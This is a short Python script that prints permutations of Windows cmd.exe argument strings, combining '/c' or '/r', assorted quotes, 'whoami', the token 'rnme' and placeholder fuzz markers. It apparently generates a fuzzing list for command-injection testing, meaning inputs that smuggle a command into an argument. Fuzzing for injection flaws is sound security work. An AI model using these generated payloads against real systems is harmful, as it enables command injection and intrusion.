#!/usr/bin/python3

# /c|/r <SPACE> "|'|<NOTHING> whoami <SPACE>|<NOTHING> <FUZZ>|"|' <FUZZ><NOTHING> <RNME> <FUZZ>|"|' <NOTHING><FUZZ>

for s1 in ('/c', '/r'):
	str1 = s1 + ' '
	for s2 in ('"', "'", ''):
		str2 = str1 + s2 + 'whoami'
		for s3 in (' ',''):
			str3 = str2 + s3
			for s4 in ('<A>', '"', "'"):
				str4 = str3 + s4
				for s5 in ('<B>',''):
					str5 = str4 + s5 + 'rnme'
					for s6 in ('<C>', '"', "'"):
						str6 = str5 + s6
						for s7 in ('','<D>'):
							str7 = str6 + s7
							print(str7)
